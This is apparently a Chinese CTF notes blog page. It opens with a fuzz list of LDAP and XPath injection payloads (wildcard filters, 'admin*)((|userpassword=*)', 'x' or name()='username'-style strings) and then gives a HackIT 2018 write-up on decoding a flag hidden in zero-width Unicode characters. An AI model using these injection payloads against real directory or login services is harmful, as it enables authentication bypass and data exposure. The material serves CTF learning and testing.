<p>查询语法：<br><a href="http://www.361way.com/ldap-query-grammar/2542.html" target="_blank" rel="noopener">http://www.361way.com/ldap-query-grammar/2542.html</a></p>
<p>fuzz:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">*</span><br><span class="line">*)(&amp;</span><br><span class="line">*))%00</span><br><span class="line">*()|%26&apos;</span><br><span class="line">*()|&amp;&apos;</span><br><span class="line">*(|(mail=*))</span><br><span class="line">*(|(objectclass=*))</span><br><span class="line">*)(uid=*))(|(uid=*</span><br><span class="line">*/*</span><br><span class="line">*|</span><br><span class="line">/</span><br><span class="line">//</span><br><span class="line">//*</span><br><span class="line">@*</span><br><span class="line">|</span><br><span class="line">admin*</span><br><span class="line">admin*)((|userpassword=*)</span><br><span class="line">admin*)((|userPassword=*)</span><br><span class="line">x&apos; or name()=&apos;username&apos; or &apos;x&apos;=&apos;y</span><br><span class="line">!</span><br><span class="line">%21</span><br><span class="line">%26</span><br><span class="line">%28</span><br><span class="line">%29</span><br><span class="line">%2A%28%7C%28mail%3D%2A%29%29</span><br><span class="line">%2A%28%7C%28objectclass%3D%2A%29%29</span><br><span class="line">%2A%7C</span><br><span class="line">%7C</span><br><span class="line">&amp;</span><br><span class="line">(</span><br><span class="line">)</span><br><span class="line">*(|(mail=*))</span><br><span class="line">*(|(objectclass=*))</span><br><span class="line">*/*</span><br><span class="line">*|</span><br><span class="line">/</span><br><span class="line">//</span><br><span class="line">//*</span><br><span class="line">@*</span><br><span class="line">x&apos; or name()=&apos;username&apos; or &apos;x&apos;=&apos;y</span><br><span class="line">|</span><br><span class="line">*()|&amp;&apos;</span><br><span class="line">admin*</span><br><span class="line">admin*)((|userpassword=*)</span><br><span class="line">*)(uid=*))(|(uid=*</span><br></pre></td></tr></table></figure>
<p>hackitctf</p>
<h1 id="ge-going"><a href="#ge-going" class="headerlink" title="ge  going"></a>ge  going</h1><p><a href="https://ctf.hackit.ua/w31c0m3" target="_blank" rel="noopener">https://ctf.hackit.ua/w31c0m3</a></p>
<p>这是个比较新的隐写思路,相关内容比较少</p>
<blockquote>
<p>零宽度字符是隐藏不显示的，也是不可打印的，也就是说这种字符用大多数程序或编辑器是看不到的。</p>
</blockquote>
<p>相关文章： </p>
<ul>
<li><a href="http://www.freebuf.com/articles/web/167903.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/web/167903.html</a></li>
<li><a href="https://www.tr0y.wang/2018/04/20/ZeroWidthSpacesHiden/" target="_blank" rel="noopener">https://www.tr0y.wang/2018/04/20/ZeroWidthSpacesHiden/</a></li>
</ul>
<p>在题目这句<code>W‏‍‏‌‎‎‏‍‏‎‏‏‎‏‎‏‍‌‎‏‏‎‏‍‏‍‌‍‌‍‌‎‏‏‏‍‍‎‏‏‏‌‍‍‌‏‍‏‏‏‍‎‏‏‎‏‌‏‏‏‎‌‏‏‎‏‏‎‍‏‍‌‏‏‎‏‏‌‏‎‏‍‌‌elcome to the HackIT 2018 CTF, flag is somewhere here. ¯_(ツ)_/¯</code>的W和e之间就隐藏着如下零宽度字符</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;rlm;&amp;#8203;&amp;zwj;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;rlm;&amp;zwnj;&amp;lrm;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;lrm;&amp;rlm;&amp;zwj;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;rlm;&amp;#8203;&amp;lrm;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;rlm;&amp;rlm;&amp;lrm;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;rlm;&amp;lrm;&amp;rlm;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;zwj;&amp;#8203;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;lrm;&amp;rlm;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;rlm;&amp;#8203;&amp;lrm;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;rlm;&amp;zwj;&amp;rlm;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;zwj;&amp;#8203;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;zwj;&amp;#8203;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;zwj;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;lrm;&amp;rlm;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;rlm;&amp;#8203;&amp;rlm;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;zwj;&amp;#8203;&amp;zwj;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;lrm;&amp;rlm;&amp;rlm;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;rlm;&amp;zwnj;&amp;zwj;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;zwj;&amp;#8203;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;rlm;&amp;zwj;&amp;rlm;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;rlm;&amp;rlm;&amp;zwj;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;lrm;&amp;rlm;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;rlm;&amp;lrm;&amp;rlm;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;rlm;&amp;rlm;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;rlm;&amp;lrm;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;rlm;&amp;#8203;&amp;rlm;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;lrm;&amp;rlm;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;rlm;&amp;lrm;&amp;zwj;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;rlm;&amp;zwj;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;rlm;&amp;rlm;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;lrm;&amp;rlm;&amp;rlm;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;rlm;&amp;lrm;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;rlm;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;#8203;&amp;zwj;&amp;#8203;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;#8203;&amp;zwnj;&amp;#8203;&amp;#8203;&amp;#8203;</span><br></pre></td></tr></table></figure>
<p><code>&amp;zwnj;</code></p>
<blockquote>
<p>它叫零宽不连字，全称是Zero Width Non Joiner，简称&ldquo;ZWNJ&rdquo;，是一个不打印字符，放在电子文本的两个字符之间，抑制本来会发生的连字，而是以这两个字符原本的字形来绘制。Unicode中的零宽不连字字符映射为&ldquo;&rdquo;（zero width non-joiner，U+200C），HTML字符值引用为： &zwnj;</p>
</blockquote>
<p><code>&amp;zwj;</code></p>
<blockquote>
<p>它叫零宽连字，全称是Zero Width Joiner，简称&ldquo;ZWJ&rdquo;，是一个不打印字符，放在某些需要复杂排版语言（如阿拉伯语、印地语）的两个字符之间，使得这两个本不会发生连字的字符产生了连字效果。零宽连字符的Unicode码位是U+200D (HTML: &zwj; &zwj;）。</p>
</blockquote>
<p><code>&amp;lrm;</code> </p>
<blockquote>
<p>左至右符号（Left-to-right mark,LRM）是一种控制字符，或者说是不可见的排版符号。左至右符号的统一码字符是U+200E，亦可在HTML中表现为&lrm; &#x200E;或者&#8206;, UTF-8中则是E2 80 8E。</p>
</blockquote>
<p><code>&amp;rlm;</code></p>
<blockquote>
<p>右至左符号（Right-to-left mark,RLM）是一种控制字符，用于计算机的双向文稿排版中。右至左符号的Unicode字符是U+200F，亦可在HTML中表现为&rlm; &#x200F;或者&#8207;</p>
</blockquote>
<p><code>&amp;#8203;</code></p>
<blockquote>
<p>零宽空格（zero-width space, ZWSP）是一种不可打印的Unicode字符，用于可能需要换行处。在Unicode中，该字符为U+200B“”零宽空格 ，HTML：&#8203;。</p>
</blockquote>
<p>这里的零宽度字符可用<a href="https://github.com/offdev/zwsp-steg-js解密" target="_blank" rel="noopener">https://github.com/offdev/zwsp-steg-js解密</a></p>
<p>de.js内容为</p>
<p><img src="https://i.loli.net/2018/09/11/5b972acc3d0f7.png" alt="ks11.png"></p>
<p>运行获取flag</p>
<p><img src="https://i.loli.net/2018/09/11/5b972b28c31c1.png" alt="ks12.png"></p>
</div><hr></div><nav id="pagination"><div class="pagination"><span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer class="footer-bg" style="background-image: url(https://i.loli.net/2019/03/17/5c8e54b412bc5.png)"><div class="layout" id="footer"><div class="copyright">&copy;2017 - 2019 By J0k3r</div><div class="framework-info"><span>驱动 - </span><a href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span><span></span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.6.1"></script><script src="/js/fancybox.js?version=1.6.1"></script><script src="/js/sidebar.js?version=1.6.1"></script><script src="/js/copy.js?version=1.6.1"></script><script src="/js/fireworks.js?version=1.6.1"></script><script src="/js/transition.js?version=1.6.1"></script><script src="/js/scroll.js?version=1.6.1"></script><script src="/js/head.js?version=1.6.1"></script><script>if(/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
}</script></body></html>